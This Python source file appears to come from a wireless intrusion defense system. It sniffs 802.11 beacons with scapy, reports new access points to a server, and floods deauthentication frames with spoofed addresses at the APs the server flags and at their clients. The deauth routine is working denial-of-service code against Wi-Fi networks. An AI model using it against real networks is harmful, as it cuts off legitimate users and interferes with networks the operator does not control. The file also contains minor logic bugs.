import subprocess
import os
import time
import threading
from itertools import cycle

import scapy.all as sc
from scapy.layers import dot11 as scl80211

import wids.client as client
import wids.widscfg as widscfg
import wids.tasks as tasks

TYPE_RADAR = 1
TYPE_ATTACK = 2

ap_list = []

# ap = (
#	ssid = "",
#	channel = n,
#	bssid = "",
#	clients = ["00:11:22:33:44:55"]
# )

ipiw_lock = threading.Lock()

class IW:
	def __init__(self, netif, iftype = TYPE_RADAR):
		self.netif = netif
		self.netifmon = netif + "mon"
		self.channel = 1
		self.detected = {}
		self.monitor = False
		self.quit = False
		self.__clients = None
		self.type = iftype
		self.task = None
		self.lasttask = None

	def set_channel(self, channel, monitor = False):
		global ipiw_lock
		if self.channel == channel:
			return True
		if monitor and not self.monitor:
			return False
		try:
			ipiw_lock.acquire()
			print("[\033[93mnetif \033[91m%s\33[0m] setting channel" % (self.netif))
			subprocess.run(["iw", "dev", self.netifmon if monitor else self.netif, "set", "channel", str(channel)])
			ipiw_lock.release()
			self.channel = channel
			return True
		except subprocess.CalledProcessError as e:
			print("[\033[93mnetif \033[91m%s\033[0m] Failed to set channel to %s:\n%s" % (self.netif, channel, e.stderr))
			return False

	def monitor_on(self):
		global ipiw_lock
		if self.monitor:
			return True
		try:
			ipiw_lock.acquire()
			print("[\033[93mnetif \033[91m%s\33[0m] creating monitor interface" % (self.netif))
			subprocess.run(["iw", "dev", self.netif, "interface", "add", self.netifmon, "type", "monitor"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			print("[\033[93mnetif \033[91m%s\33[0m] bringing monitor up" % (self.netif))
			subprocess.run(["ip", "link", "set", self.netifmon, "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			ipiw_lock.release()
			self.monitor = True
			print("[\033[93mnetif \033[91m%s\033[0m] monitor on" % self.netif)
			return True
		except subprocess.CalledProcessError as e:
			print("[\033[93mnetif \033[91m%s\033[0m] Failed to set monitor mode on:\n%s\nFailed command: %s" % (self.netif, e.stderr, ' '.join(e.args[1])))
			return False

	def monitor_off(self):
		global ipiw_lock
		if not self.monitor:
			return True
		try:
			ipiw_lock.acquire()
			print("[\033[93mnetif \033[91m%s\33[0m] bringing monitor down" % (self.netif))
			subprocess.run(["ip", "link", "set", self.netifmon, "down"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			print("[\033[93mnetif \033[91m%s\33[0m] deleting monitor" % (self.netif))
			time.sleep(0.25) # wait for ip to bring the if fully down
			subprocess.run(["iw", "dev", self.netifmon, "del"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			ipiw_lock.release()
			self.monitor = False
			print("[\033[93mnetif \033[91m%s\033[0m] monitor off" % self.netif)
			return True
		except subprocess.CalledProcessError as e:
			print("[\033[93mnetif \033[91m%s\033[0m] Failed to turn off monitor mode:\n%s\nFailed command: %s" % (self.netif, e.stderr, ' '.join(e.args[1])))
			return False

	def process(self, pkt, channel):
		if self.quit:
			raise Exception()
		p_radiotap = pkt
		p_80211 = p_radiotap.getlayer(scl80211.Dot11)
		
		if not p_80211:
			return

		addrs = [p_80211.addr1, p_80211.addr2, p_80211.addr3, p_80211.addr4]
		if p_80211.type == 2: # data frame
			for ap in ap_list:
				if ap[2] in addrs:
					for addr in addrs:
						if addr != ap[2]:
							if addr != "00:00:00:00:00:00" or addr != "ff:ff:ff:ff:ff:ff":
								ap[3].append(addr)
			return

		if p_80211.type != 0 and p_80211.subtype != 8:
			return
		
		p_beacon = p_80211.getlayer(scl80211.Dot11Beacon)
		if not p_beacon:
			return

		ssid = None
		mac = None
		
		if p_beacon.payload.ID == 0:
			ssid = p_beacon.payload.info.decode("UTF-8")
		mac = p_80211.addr2

		t = (ssid, mac)
		ts = "%s-%s" % t

		if ts not in self.detected:
			self.detected[ts] = {
				"lastseen" : time.time(),
				"lastreported" : time.time()
			}
			print("[\033[93mnetif \033[91m%s\033[0m] New AP detected: %s" % (self.netif, str(t)))
			self.report(t[0], channel, mac)
		else:
			te = self.detected[ts]
			te["lastseen"] = time.time()
			if te["lastseen"] - te["lastreported"] > 60:
				self.report(t[0], channel, mac)
				te["lastreported"] = time.time()

	def request_task(self, task):
		if self.type == TYPE_ATTACK and task.type == tasks.TYPE_WIRELESS_ATARGET:
			if task.acquire(): # if task is not locked by another device, lock it
				return False
			else:
				self.task = task # and set is as the task
				self.lasttask = task
				print("[\033[93mnetif \033[91m%s\033[0m] Attack task acquired: %s" % (self.netif, self.task.target))
				return True
		if self.type == TYPE_RADAR and task.type == tasks.TYPE_WIRELESS_STARGET:
			if task.acquire():
				return False
			else:
				self.task = task
				self.lasttask = task
				return True

	def loop(self):
		global ap_list
		start = time.time()
		stage = 0 # 0 - 
		tap = None
		while not self.quit:
			if not self.task:
				foundlasttask = False
				iterator = cycle(tasks.tasks)
				for task in iterator:
					if self.quit:
						break
					if not self.lasttask:
						foundlasttask = True
					if task == self.lasttask:
						foundlasttask = True
						continue
					if not foundlasttask:
						continue
					if self.request_task(task):
						start = time.time()
						break
					else:
						continue
			else:
				if self.type == TYPE_ATTACK:
					if self.channel != self.task.target[1]:
						self.set_channel(self.task.target[1])

					if not tap:
						for ap in ap_list:
							if ap[0] == self.task.target[0] and ap[2] == self.task.target[2]:
								tap = ap
								break

					# broadcast method
					self.deauth(self.task.target[0], self.task.target[2])

					# addressed method
					if tap:
						for client in tap[3]:
							self.deauth(self.task.target[0], self.task.target[2], client)

					if time.time() - start > 0.5:
						self.task.unlock()
						self.task = None

				elif self.type == TYPE_RADAR:
					if self.channel != self.task.target[0]:
						self.set_channel(self.task.target[0])
					try:
						sc.sniff(iface=self.netifmon, prn=lambda x: self.process(x, self.channel), count=25, timeout=1)
					except:
						pass
					if time.time() - start > 0.5:
						self.task.unlock()
						self.task = None

	def report(self, name, channel, mac):
		sc = client.ServerClient()
		csuc, rsuc, verdict, msg = sc.report(name, mac)
		if not csuc:
			print("[\033[93mnetif \033[91m%s\033[0m] Cannot connect to server: %s" % (self.netif, msg))
		elif not rsuc:
			print("[\033[93mnetif \033[91m%s\033[0m] Cannot report to server: %s" % (self.netif, msg))

		if verdict:
			print("[\033[93mnetif \033[91m%s\033[0m] Queueing attack of %s" % (self.netif, name))
			tasks.task_add(tasks.Task(target=(name, channel, mac), ttype=tasks.TYPE_WIRELESS_ATARGET))
			global ap_list
			ape = None
			for ap in ap_list:
				if ap[0] == name and ap[1] == mac:
					ape = ap
					break
			if not ape:
				ap_list.append((name, channel, mac, []))

	def deauth(self, ssid, mac, client="FF:FF:FF:FF:FF:FF"):
		# AP -> Client
		p1 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=client, addr2 = mac,addr3 = mac)/sc.Dot11Deauth(reason=5) # reason = "AP cannot handle this many stations"
		# Client -> AP
		p2 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=mac, addr2 = client,addr3 = mac)/sc.Dot11Deauth(reason=8) # reason = "Client is leaving"

		# socket (for performance)
		s = sc.conf.L2socket(iface=self.netifmon)
		for i in range(100):
			s.send(p1)
			s.send(p2)
		s.close()
